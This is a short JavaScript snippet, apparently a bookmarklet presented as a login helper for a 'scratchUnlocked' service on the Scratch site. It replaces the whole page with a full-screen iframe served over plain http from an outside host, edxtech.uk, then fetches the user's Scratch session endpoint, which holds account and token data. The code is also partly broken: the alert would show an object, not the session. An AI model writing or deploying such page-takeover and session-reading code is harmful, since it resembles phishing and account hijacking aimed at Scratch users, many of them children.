// Logs in users to scratchUnlocked.
document.title = "scratchUnlocked"
  var content = '<iframe src="http://edxtech.uk/scratchunlocked/logininprogress.php" style="position:fixed; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;"></iframe>';
    document.getElementsByTagName('body')[0].innerHTML = content; 
alert($.getJSON("https://scratch.mit.edu/session/"));
alert("Up and running");
